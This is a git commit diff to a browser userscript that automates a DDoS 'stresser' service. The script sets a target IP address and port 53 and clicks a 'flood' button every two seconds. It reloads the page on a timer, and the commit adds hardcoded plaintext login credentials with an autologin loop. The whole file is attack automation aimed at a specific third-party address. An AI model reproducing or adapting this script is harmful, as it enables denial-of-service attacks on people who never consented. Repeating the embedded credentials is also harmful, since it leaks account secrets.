6bcf3e9d921f11367abd0d973d1e24789e58d800
natasyabimosakti <158560322+natasyabimosakti@users.noreply.github.com>
2025-01-17 11:50:49 +0700

    Update reperter stresser zone.js

--- reperter stresser zone.js
+++ reperter stresser zone.js
@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         New Userscript
 // @namespace    http://tampermonkey.net/
-// @version      2024-08-18
+// @version      3.NaN
 // @description  try to take over the world!
 // @author       You
 // @match        http*://*/*
@@ -19,6 +19,9 @@
 //TCP
 // index 5 = SYN
 // index 6 = ACK
+var username ="minochi91"
+var password = "scorpio1991"
+
 
 var iptarget1="103.222.255.36";
 var porttarget1="53";
@@ -55,6 +58,24 @@ var autoddos2 = setInterval(function (){
         L4btn('flood', '');
 
 },2000)
+
+
+
+var autologin = setInterval(function (){
+    if(document.querySelectorAll("[href='login']")[0]){
+       document.querySelectorAll("[href='login']")[0].click()
+    }
+    if(document.location.href.includes("login")){
+        document.getElementById("username").value = username
+        document.getElementById("password").value = password
+        document.getElementById("loginForm").click()
+
+    }
+
+
+},5000)
+
+
 window.setTimeout( function() {
   window.location.reload();
 }, 10000);
